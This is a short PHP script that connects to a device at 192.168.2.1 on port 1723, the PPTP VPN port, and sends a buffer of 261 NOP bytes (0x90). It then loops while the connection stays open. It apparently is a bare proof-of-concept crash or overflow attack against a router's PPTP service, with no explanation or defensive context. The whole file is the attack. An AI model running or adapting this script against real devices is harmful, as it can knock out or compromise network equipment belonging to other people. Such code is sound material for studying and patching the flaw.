<?php
$apaddr = "192.168.2.1";
$apport="1723";


$con = fsockopen($apaddr, $apport, $errno, $errstr);
if (!$con) {
    echo "$errstr ($errno)<br />\n";
} else {
    $trash = str_repeat("\x90","261");
    fwrite($con, $trash);
    while (!feof($con)) {
        echo "$trash \r\n";
    }
    fclose($con);
}
?>
